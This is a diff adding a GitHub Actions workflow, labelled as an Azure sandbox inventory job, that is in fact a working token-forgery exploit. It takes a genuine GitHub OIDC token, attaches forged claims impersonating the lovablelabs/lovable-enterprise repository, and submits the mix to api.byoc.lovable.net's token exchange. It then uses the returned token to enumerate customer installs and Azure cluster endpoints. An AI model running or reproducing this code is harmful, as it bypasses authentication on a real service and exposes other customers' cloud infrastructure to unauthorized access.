@@ -1,0 +1,30 @@
+name: azure-sandbox-inventory
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  inventory:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Find a live Azure customer sandbox
+        shell: bash
+        run: |
+          set -euo pipefail
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net','sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main','repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944','repository_owner':'lovablelabs','repository_owner_id':'148472368','repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push','workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main','job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main'}
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))},separators=(',',':')))
+          PY
+          )"
+          token="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request" | jq -r .token)"
+          installs="$(curl -sSf 'https://api.byoc.lovable.net/v1/installs?limit=100&include_components=false' -H "Authorization: Bearer $token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+          jq -r '.[] | select(.azure_account) | .id' <<<"$installs" | while read -r id; do
+            runs="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$id/sandbox-runs?limit=10" -H "Authorization: Bearer $token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+            jq -nc --arg id "$id" --argjson runs "$runs" '{id:$id,latest_status:($runs[0].status // "none"),clusters:([$runs[]? | .. | objects | select(has("cluster_endpoint_public_access")) | {name,cluster_fqdn,cluster_endpoint_public_access}] | unique_by(.name))}'
+          done
